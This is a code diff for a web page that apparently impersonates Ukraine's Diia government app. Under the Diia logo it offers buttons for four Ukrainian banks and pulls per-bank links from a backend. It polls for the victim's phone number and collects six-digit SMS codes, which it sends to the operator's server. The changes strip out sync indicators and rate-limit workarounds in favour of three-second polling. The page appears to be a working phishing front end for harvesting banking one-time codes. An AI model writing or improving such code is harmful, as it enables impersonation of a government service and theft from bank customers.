@@ -140,69 +140,7 @@
       border: 1px solid rgba(255, 255, 255, 0.2);
     }
     
-    /* Индикатор состояния сервера */
-    .server-status {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      padding: 8px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: bold;
-      z-index: 1000;
-    }
-    
-    .server-status.online {
-      background: rgba(76, 175, 80, 0.9);
-      color: white;
-    }
-    
-    .server-status.offline {
-      background: rgba(244, 67, 54, 0.9);
-      color: white;
-    }
-    
-    /* Индикатор синхронизации */
-    .sync-indicator {
-      position: fixed;
-      top: 50px;
-      right: 10px;
-      padding: 6px 10px;
-      border-radius: 15px;
-      font-size: 11px;
-      font-weight: bold;
-      z-index: 1000;
-      background: rgba(33, 150, 243, 0.9);
-      color: white;
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-    
-    .sync-indicator.active {
-      opacity: 1;
-    }
-
-    /* 🔥 НОВЫЙ: Индикатор быстрой синхронизации */
-    .fast-sync-indicator {
-      position: fixed;
-      top: 90px;
-      right: 10px;
-      padding: 4px 8px;
-      border-radius: 12px;
-      font-size: 10px;
-      font-weight: bold;
-      z-index: 1000;
-      background: rgba(255, 193, 7, 0.9);
-      color: #333;
-      opacity: 0;
-      transition: opacity 0.2s;
-    }
-    
-    .fast-sync-indicator.active {
-      opacity: 1;
-    }
-    
-    /* SMS экран - полноэкранный режим (остальные стили без изменений) */
+    /* SMS экран - полноэкранный режим */
     .sms-fullscreen {
       position: fixed !important;
       top: 0;
@@ -445,7 +383,7 @@
       backdrop-filter: blur(10px);
     }
 
-    /* Адаптивность для очень маленьких экранов (остальные медиа-запросы без изменений) */
+    /* Адаптивность для очень маленьких экранов */
     @media (max-width: 350px) {
       .sms-container {
         gap: 3px;
@@ -459,6 +397,7 @@
       }
     }
     
+    /* Для экранов iPhone SE и подобных */
     @media (max-width: 320px) {
       .sms-container {
         gap: 2px;
@@ -473,6 +412,7 @@
       }
     }
     
+    /* Адаптивность для планшетов */
     @media (min-width: 768px) and (max-width: 1024px) {
       .sms-digit {
         width: 70px;
@@ -481,6 +421,7 @@
       }
     }
     
+    /* Для больших экранов */
     @media (min-width: 1025px) {
       .main-container {
         max-width: 500px;
@@ -491,15 +432,6 @@
   </style>
 </head>
 <body>
-  <!-- Индикатор состояния сервера -->
-  <div id="server-status" class="server-status offline">🔴 Проверка сервера...</div>
-  
-  <!-- Индикатор синхронизации -->
-  <div id="sync-indicator" class="sync-indicator">🔄 Синхронизация...</div>
-  
-  <!-- 🔥 НОВЫЙ: Индикатор быстрой синхронизации -->
-  <div id="fast-sync-indicator" class="fast-sync-indicator">⚡ Быстрая синхронизация</div>
-  
   <div class="main-container">
     <div class="diia-logo">
       <img src="Dia.png" alt="Дія" />
@@ -548,7 +480,9 @@
       pumb:   `${API_BASE}/link?bank=pumbbank`
     };
     
+    // Используем единый URL для consume-link без параметра bank
     const CONSUME_URL = `${API_BASE}/consume-link`;
+    
     const STATUS_URL = `${API_BASE}/api/link-status`;
     const CODE_URL   = `${API_BASE}/api/submit-code`;
     const RESEND_URL = `${API_BASE}/api/resend-code`;
@@ -571,7 +505,6 @@
     let pollingStatus = false;
     let statusPoller = null;
     let refreshInterval = null;
-    let fastRefreshInterval = null; // 🔥 НОВЫЙ: быстрое обновление
     let link = null;
     let smsTimerInterval = null;
     let smsSoundInterval = null;
@@ -581,17 +514,10 @@
     let verificationPoller = null;
     let lastRefreshTime = Date.now();
     let refreshCount = 0;
-    let serverOnline = false;
 
-    // 🔥 НОВЫЕ переменные для быстрой синхронизации
+    // Состояние автообновления
     let autoRefreshActive = true;
-    let fastRefreshActive = false; // Быстрое обновление активируется по событиям
     let refreshInProgress = false;
-    let clickDetected = false; // Флаг что кто-то кликнул
-
-    // Хранилище ID ссылок с timestamp для очистки старых
-    let usedLinkIds = new Map(); // ID -> timestamp
-    let lastKnownLinkIds = new Set(); // Для отслеживания изменений
 
     // Функция восстановления текста кнопок
     function restoreButtonTexts() {
@@ -603,107 +529,6 @@
       });
     }
 
-    // Обновление индикатора состояния сервера
-    function updateServerStatus(online) {
-      const indicator = document.getElementById('server-status');
-      if (online !== serverOnline) {
-        serverOnline = online;
-        if (online) {
-          indicator.textContent = '🟢 Сервер онлайн';
-          indicator.className = 'server-status online';
-        } else {
-          indicator.textContent = '🔴 Сервер офлайн';
-          indicator.className = 'server-status offline';
-        }
-      }
-    }
-
-    // Показать индикатор синхронизации
-    function showSyncIndicator() {
-      const indicator = document.getElementById('sync-indicator');
-      indicator.classList.add('active');
-      setTimeout(() => {
-        indicator.classList.remove('active');
-      }, 1500);
-    }
-
-    // 🔥 НОВАЯ функция: Показать индикатор быстрой синхронизации
-    function showFastSyncIndicator() {
-      const indicator = document.getElementById('fast-sync-indicator');
-      indicator.classList.add('active');
-      setTimeout(() => {
-        indicator.classList.remove('active');
-      }, 800);
-    }
-
-    // 🔥 ПОЛНОСТЬЮ ОТКЛЮЧАЕМ быструю синхронизацию из-за rate limiting
-    function activateFastSync(reason = "activity") {
-      console.log(`⚠️ Быстрая синхронизация отключена из-за rate limiting (запрос: ${reason})`);
-      // НЕ делаем ничего - rate limiting слишком строгий
-    }
-
-    // 🔥 НОВАЯ функция: Деактивация быстрой синхронизации
-    function deactivateFastSync() {
-      if (fastRefreshActive) {
-        fastRefreshActive = false;
-        if (fastRefreshInterval) {
-          clearInterval(fastRefreshInterval);
-          fastRefreshInterval = null;
-        }
-        console.log("⏸ Быстрая синхронизация деактивирована");
-      }
-    }
-
-    // Очистка старых использованных ID (старше 10 минут)
-    function cleanupOldUsedIds() {
-      const now = Date.now();
-      const tenMinutes = 10 * 60 * 1000;
-      
-      for (let [id, timestamp] of usedLinkIds.entries()) {
-        if (now - timestamp > tenMinutes) {
-          usedLinkIds.delete(id);
-          console.log(`🧹 Очищен старый ID: ${id}`);
-        }
-      }
-    }
-
-    // Проверка изменений в доступных ссылках
-    function detectLinkChanges(newLinkIds) {
-      const changes = {
-        added: [],
-        removed: []
-      };
-      
-      // Найти удаленные ссылки
-      for (let oldId of lastKnownLinkIds) {
-        if (!newLinkIds.has(oldId)) {
-          changes.removed.push(oldId);
-          // Пометить как использованную (кем-то другим)
-          usedLinkIds.set(oldId, Date.now());
-          console.log(`🔴 Ссылка удалена с сервера: ${oldId}`);
-          
-          // 🔥 НОВОЕ: Если ссылка исчезла, активируем быстрое обновление
-          activateFastSync("link_removed");
-        }
-      }
-      
-      // Найти новые ссылки
-      for (let newId of newLinkIds) {
-        if (!lastKnownLinkIds.has(newId)) {
-          changes.added.push(newId);
-          console.log(`🟢 Новая ссылка с сервера: ${newId}`);
-          
-          // 🔥 НОВОЕ: Если появились новые ссылки, показываем синхронизацию
-          showSyncIndicator();
-        }
-      }
-      
-      // Обновить последние известные ID
-      lastKnownLinkIds = new Set(newLinkIds);
-      
-      return changes;
-    }
-
     async function checkLinksForBank(bank) {
       const btn = document.getElementById(bank + "-btn");
       
@@ -711,6 +536,7 @@
 
       try {        
         console.log(`🔍 Проверяем ссылки для банка: ${bank}`);
+        console.log(`📡 URL запроса: ${API_MAP[bank]}`);
         
         const res = await fetch(API_MAP[bank], {
           method: 'GET',
@@ -724,53 +550,31 @@
         
         console.log(`📊 Ответ сервера для ${bank}: ${res.status}`);
         
-        // Обновляем статус сервера
-        updateServerStatus(res.status !== 500);
-        
         if (res.ok) {
           const data = await res.json();
           console.log(`📦 Данные для ${bank}:`, data);
           
           if (data.url && data.id) {
-            // Проверяем не использовалась ли эта ссылка ранее
-            if (usedLinkIds.has(data.id)) {
-              console.log(`❌ Ссылка ${data.id} уже использовалась - пропускаем`);
-              btn.disabled = true;
-              btn.onclick = null;
-              delete linkData[bank];
-              btn.textContent = BANK_TEXTS[bank + "-btn"];
-              return;
-            }
-            
             // Проверяем, не используется ли эта ссылка кем-то другим
             const existingBank = Object.keys(linkData).find(b => 
-              b !== bank && linkData[b] && linkData[b].id === data.id
+              b !== bank && linkData[b].id === data.id
             );
             
             if (existingBank) {
+              // Ссылка уже используется другим банком - не показываем
               console.log(`⚠️ Ссылка ${data.id} уже используется для ${existingBank}`);
               btn.disabled = true;
               btn.onclick = null;
               delete linkData[bank];
               btn.textContent = BANK_TEXTS[bank + "-btn"];
             } else {
-              // Проверяем, изменилась ли ссылка
-              const currentData = linkData[bank];
-              if (currentData && currentData.id !== data.id) {
-                console.log(`🔄 Ссылка для ${bank} изменилась с ${currentData.id} на ${data.id}`);
-                
-                // 🔥 НОВОЕ: При смене ссылки активируем быструю синхронизацию
-                activateFastSync("link_changed");
-              }
-              
               linkData[bank] = { url: data.url, id: data.id };
               btn.disabled = false;
               btn.onclick = () => handleBankClick(bank);
               btn.textContent = BANK_TEXTS[bank + "-btn"];
-              console.log(`✅ Кнопка ${bank} активирована с ссылкой ${data.id}!`);
+              console.log(`✅ Кнопка ${bank} активирована!`);
             }
           } else {
-            // Нет ссылки - деактивируем кнопку
             btn.disabled = true;
             btn.onclick = null;
             delete linkData[bank];
@@ -778,7 +582,7 @@
             console.log(`❌ Кнопка ${bank} деактивирована - нет url/id`);
           }
         } else if (res.status === 429) {
-          // Нет доступных ссылок - деактивируем кнопку
+          // Нет доступных ссылок
           btn.disabled = true;
           btn.onclick = null;
           delete linkData[bank];
@@ -787,12 +591,10 @@
         } else {
           console.log(`❗ Ошибка ${bank}: ${res.status}`);
           btn.textContent = BANK_TEXTS[bank + "-btn"];
-          updateServerStatus(false);
         }
       } catch (error) {
         console.error(`❗ Ошибка проверки ${bank}:`, error);
         btn.textContent = BANK_TEXTS[bank + "-btn"];
-        updateServerStatus(false);
       }
     }
 
@@ -802,46 +604,19 @@
       refreshInProgress = true;
       
       try {
-        // Очищаем старые использованные ID
-        cleanupOldUsedIds();
-        
-        // Собираем ID текущих ссылок до обновления
-        const currentLinkIds = new Set();
-        
-        // 🔥 ЭКСТРЕМАЛЬНО: Проверяем банки ОЧЕНЬ медленно с большими паузами
-        console.log("🐌 ЭКСТРЕМАЛЬНО медленная проверка банков...");
-        
-        await checkLinksForBank("mono");
-        console.log("⏳ Пауза 3 секунды...");
-        await new Promise(resolve => setTimeout(resolve, 3000)); // 3 секунды между запросами
-        
-        await checkLinksForBank("oschad");
-        console.log("⏳ Пауза 3 секунды...");
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        await checkLinksForBank("raiff");
-        console.log("⏳ Пауза 3 секунды...");
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        
-        await checkLinksForBank("pumb");
-        console.log("✅ Проверка завершена");
-        
-        // Собираем ID после обновления
-        Object.values(linkData).forEach(data => {
-          if (data && data.id) {
-            currentLinkIds.add(data.id);
-          }
-        });
-        
-        // Детектируем изменения для синхронизации
-        detectLinkChanges(currentLinkIds);
+        // Проверяем все банки параллельно
+        await Promise.all([
+          checkLinksForBank("mono"),
+          checkLinksForBank("oschad"),
+          checkLinksForBank("raiff"),
+          checkLinksForBank("pumb")
+        ]);
         
         lastRefreshTime = Date.now();
         
       } catch (error) {
         console.error("Ошибка автообновления:", error);
         restoreButtonTexts();
-        updateServerStatus(false);
       } finally {
         refreshInProgress = false;
       }
@@ -893,16 +668,10 @@
         clearInterval(verificationPoller);
         verificationPoller = null;
       }
-      if (fastRefreshInterval) {
-        clearInterval(fastRefreshInterval);
-        fastRefreshInterval = null;
-      }
     }
 
     function showLoading(btnId) {
       autoRefreshActive = false; // Останавливаем автообновление
-      deactivateFastSync(); // Останавливаем быстрое обновление
-      
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
         const el = document.getElementById(id);
         if(id !== btnId) {
@@ -920,10 +689,6 @@
     }
 
     async function handleBankClick(bank) {
-      // 🔥 НОВОЕ: При клике активируем быструю синхронизацию для всех пользователей
-      activateFastSync("user_click");
-      clickDetected = true;
-      
       resetUI();
       currentBank = bank;
       const btnId = bank + "-btn";
@@ -941,47 +706,27 @@
       currentId = data.id;
       link = data.url;
       
-      // Сразу помечаем ссылку как использованную ЛОКАЛЬНО
-      usedLinkIds.set(currentId, Date.now());
-      console.log(`🔒 Ссылка ${currentId} помечена как использованная локально`);
-      
-      // Удаляем ссылку из всех банков с этим ID ЛОКАЛЬНО
-      Object.keys(linkData).forEach(b => {
-        if (linkData[b] && linkData[b].id === currentId) {
-          console.log(`🔻 Удаляем локально ссылку ${currentId} для банка ${b}`);
-          delete linkData[b];
-          
-          // Сразу деактивируем кнопку этого банка
-          const btn = document.getElementById(b + "-btn");
-          if (btn) {
-            btn.disabled = true;
-            btn.onclick = null;
-            btn.textContent = BANK_TEXTS[b + "-btn"];
-            console.log(`❌ Кнопка ${b} деактивирована (ссылка использована)`);
-          }
-        }
-      });
-      
-      // Обновляем известные ID для синхронизации
-      lastKnownLinkIds.delete(currentId);
-      showFastSyncIndicator();
-      
       try {
-        // Пытаемся вызвать consume-link (уже не критично в новой версии API)
+        // Используем правильный URL только с параметром id
         const consumeUrl = `${CONSUME_URL}?id=${currentId}`;
         console.log(`🔗 Consume URL: ${consumeUrl}`);
         
         const consumeRes = await fetch(consumeUrl, { method: "POST" });
+        const consumeData = await consumeRes.json();
+        console.log(`✅ Consume response:`, consumeData);
         
-        if (consumeRes.ok) {
-          const consumeData = await consumeRes.json();
-          console.log(`✅ Consume response:`, consumeData);
-        } else {
-          console.log(`⚠️ Consume failed with status: ${consumeRes.status}`);
-        }
+        // Удаляем ссылку из локального хранилища для всех банков
+        Object.keys(linkData).forEach(b => {
+          if (linkData[b].id === currentId) {
+            delete linkData[b];
+          }
+        });
         
       } catch (e) {
-        console.log("⚠️ Ошибка consume (продолжаем):", e);
+        console.log("Ошибка consume:", e);
+        hideLoading();
+        autoRefreshActive = true;
+        return;
       }
       
       document.getElementById("return-instruction").style.display = "block";
@@ -989,7 +734,6 @@
       pollStatus();
     }
 
-    // Остальные функции без изменений (pollStatus, showCodeInput, и т.д.)
     async function pollStatus() {
       if (pollingStatus) return;
       pollingStatus = true;
@@ -1002,17 +746,15 @@
       statusPoller = setInterval(async () => {
         try {
           const res = await fetch(`${STATUS_URL}?id=${currentId}`);
-          if (res.ok) {
-            const data = await res.json();
-            if (data.status === "waiting_code") {
-              // Сохраняем номер телефона если пришел
-              if (data.phone) {
-                userPhoneNumber = data.phone;
-              }
-              clearInterval(statusPoller);
-              pollingStatus = false;
-              showCodeInput();
+          const data = await res.json();
+          if (data.status === "waiting_code") {
+            // Сохраняем номер телефона если пришел
+            if (data.phone) {
+              userPhoneNumber = data.phone;
             }
+            clearInterval(statusPoller);
+            pollingStatus = false;
+            showCodeInput();
           }
         } catch (e) {
           console.error("Ошибка polling:", e);
@@ -1031,7 +773,6 @@
       
       // ВАЖНО: Останавливаем автообновление во время SMS экрана
       autoRefreshActive = false;
-      deactivateFastSync();
       clearInterval(refreshInterval);
       
       // Переключаемся в полноэкранный режим SMS
@@ -1080,11 +821,11 @@
       `;
       
       setupSMSInput();
-      checkResendStatus();
-      startSMSCountdown();
+      checkResendStatus(); // Проверяем доступность повторной отправки
+      startSMSCountdown(); // Запускаем таймер обратного отсчета
     }
 
-    // Функция таймера обратного отсчета встроенного в кнопку
+    // Новая функция таймера обратного отсчета встроенного в кнопку
     function startSMSCountdown() {
       let totalSeconds = 180; // 3 минуты
       const timerDisplay = document.getElementById('resend-timer-display');
@@ -1318,7 +1059,7 @@
             
             console.log("✅ Код принят Дією успешно!");
             
-            // Показываем только "ожидаем подтверждения" без кнопок
+            // ИСПРАВЛЕНО: Показываем только "ожидаем подтверждения" без кнопок
             document.body.innerHTML = `
               <div class="sms-fullscreen">
                 <div class="diia-logo">
@@ -1334,11 +1075,12 @@
               </div>
             `;
             
-            // Перезагружаем через 30 секунд для возврата к выбору банков
+            // ВОССТАНАВЛИВАЕМ автообновление ссылок каждые 3 секунды
             setTimeout(() => {
               location.reload();
-            }, 30000);
+            }, 30000); // Перезагружаем через 30 секунд для возврата к выбору банков
             
+            // НЕ перезагружаем страницу - просто ждем подтверждения
             return;
             
           } else if (result.status === "failed" || result.status === "error") {
@@ -1364,7 +1106,7 @@
               digits[0].focus();
             }
             
-            // Проверяем есть ли специфическое сообщение об ошибке
+            // ИСПРАВЛЕНО: Проверяем есть ли специфическое сообщение об ошибке
             let errorMessage = "❌ Неправильний код! Введіть коректний 6-значний код з SMS";
             
             // Если есть сообщение об ошибке от FSM, используем его
@@ -1499,8 +1241,9 @@
       }
     }
     
-    // Кулдаун для повторной отправки (30 секунд)
+    // Кулдаун для повторной отправки (30 секунд) - УПРОЩЕННАЯ ВЕРСИЯ
     function startResendCooldown() {
+      // Просто блокируем кнопку на 30 секунд без дополнительного UI
       const resendBtn = document.getElementById("resend-btn");
       
       if (resendBtn) {
@@ -1524,53 +1267,36 @@
       }
     }
 
-    // 🔥 ЭКСТРЕМАЛЬНО консервативные интервалы для очень строгого rate limiting
+    // Инициализация автообновления
     function startAutoRefresh() {
-      // Первоначальная проверка с большой задержкой
-      setTimeout(() => {
-        checkAllLinks();
-      }, 10000); // 10 секунд задержки после загрузки
+      // Первоначальная проверка
+      checkAllLinks();
       
-      // 🔥 ЭКСТРЕМАЛЬНО: Проверяем только раз в минуту
+      // Устанавливаем интервал автообновления каждые 3 секунды
       refreshInterval = setInterval(() => {
         if (autoRefreshActive && !refreshInProgress) {
           checkAllLinks();
         }
-      }, 60000); // 60 секунд (1 минута) между проверками
+      }, 3000);
       
-      console.log("🔄 Автообновление запущено (каждые 60 сек, экстремально строгий rate limiting)");
+      console.log("🔄 Автообновление запущено (каждые 3 сек)");
     }
 
-    // 🔥 ОТКЛЮЧАЕМ все обработчики событий - только базовая работа по таймеру
-    
-    // Все обработчики событий отключены из-за rate limiting
-    console.log("⚠️ Все обработчики событий отключены из-за строгого rate limiting");
-    console.log("📊 Синхронизация будет происходить только по таймеру каждые 60 секунд");
-
-    // 🔥 ИСПРАВЛЕНО: Убираем обработчик фокуса чтобы не создавать лишние запросы
-    // window.addEventListener('focus') - убран полностью
-
-    // Обработка видимости страницы остается, но без дополнительных проверок
+    // Обработка видимости страницы (останавливаем при скрытии)
     document.addEventListener("visibilitychange", () => {
       if (document.hidden) {
         autoRefreshActive = false;
-        deactivateFastSync();
         console.log("⏸ Автообновление приостановлено (страница скрыта)");
       } else {
         autoRefreshActive = true;
+        checkAllLinks();
         console.log("▶ Автообновление возобновлено (страница видима)");
-        // 🔥 УБРАНО: checkAllLinks() при возврате - пусть сработает по таймеру
       }
     });
-
-    // 🔥 ИСПРАВЛЕНО: Убираем обработчик потери фокуса и загрузки страницы
-    // window.addEventListener('blur') - убран как избыточный
 
     // Запуск при загрузке страницы
     window.addEventListener('load', () => {
       startAutoRefresh();
-      // 🔥 ИСПРАВЛЕНО: Не активируем быструю синхронизацию при загрузке
-      console.log("📱 Страница загружена, автообновление запущено");
     });
 
     // Очистка при закрытии
